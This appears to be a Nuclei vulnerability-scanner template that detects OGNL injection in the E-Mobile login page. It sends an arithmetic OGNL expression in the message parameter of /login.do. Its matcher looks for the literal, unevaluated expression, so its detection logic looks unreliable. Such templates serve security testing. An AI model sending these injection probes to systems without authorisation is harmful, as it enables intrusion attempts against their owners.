id: e-mobile-ognl-injection

info:
  name: E-Mobile Ognl Injection
  author: pikpikcu
  severity: high
  reference:
    - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
    - https://mp.weixin.qq.com/s/EbzjQvHTl7k9flG-7lqAvA
  tags: ognl,injection,rce

requests:
  - method: GET
    path:
      - '{{BaseURL}}/login.do?message=66*66*66-66666'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '66*66*66-66666'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
